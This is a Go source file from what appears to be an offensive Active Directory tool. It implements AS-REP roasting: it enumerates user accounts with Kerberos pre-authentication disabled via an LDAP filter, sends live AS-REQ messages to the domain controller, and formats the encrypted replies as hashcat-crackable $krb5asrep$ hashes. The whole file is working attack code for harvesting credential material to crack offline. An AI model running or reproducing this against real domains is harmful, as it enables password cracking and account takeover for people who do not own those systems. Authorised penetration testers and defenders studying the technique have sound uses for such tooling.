package kerberos

import (
	"encoding/hex"
	"fmt"

	mtkrb "github.com/TheManticoreProject/Manticore/network/kerberos"
	"github.com/TheManticoreProject/Manticore/network/ldap/ldap_attributes"

	"github.com/0xbbuddha/GoFenrir/protocols/ldap"
)

type ASREPRoastEntry struct {
	SAMAccountName string
	DN             string
}

type ASREPRoastHash struct {
	Username string
	Hash     string
}

func EnumASREPRoastable(s *ldap.Session) ([]ASREPRoastEntry, error) {
	filter := fmt.Sprintf(
		"(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=%d))",
		ldap_attributes.UAF_DONT_REQ_PREAUTH,
	)

	entries, err := s.LdapSession.QueryWholeSubtree(
		"",
		filter,
		[]string{"sAMAccountName", "distinguishedName"},
	)
	if err != nil {
		return nil, fmt.Errorf("failed to enumerate AS-REP roastable accounts: %w", err)
	}

	var results []ASREPRoastEntry
	for _, entry := range entries {
		results = append(results, ASREPRoastEntry{
			SAMAccountName: entry.GetAttributeValue("sAMAccountName"),
			DN:             entry.GetAttributeValue("distinguishedName"),
		})
	}
	return results, nil
}

// ASREPRoastActive sends a real AS-REQ for each vulnerable account and returns
// the encrypted reply formatted as a hashcat-crackable hash ($krb5asrep$).
func ASREPRoastActive(entries []ASREPRoastEntry, realm, kdcHost string) []ASREPRoastHash {
	var results []ASREPRoastHash
	for _, e := range entries {
		result, err := mtkrb.ASREPRoast(e.SAMAccountName, realm, kdcHost)
		if err != nil {
			continue
		}
		if hash := formatASREPHash(result); hash != "" {
			results = append(results, ASREPRoastHash{Username: e.SAMAccountName, Hash: hash})
		}
	}
	return results
}

// formatASREPHash formats an AS-REP result as a hashcat $krb5asrep$ hash.
// Split: first 16 bytes = checksum, remainder = encrypted data.
func formatASREPHash(r *mtkrb.ASREPRoastResult) string {
	if len(r.CipherText) < 17 {
		return ""
	}
	checksum := hex.EncodeToString(r.CipherText[:16])
	data := hex.EncodeToString(r.CipherText[16:])
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
		r.EncryptionType, r.Username, r.Realm, checksum, data)
}
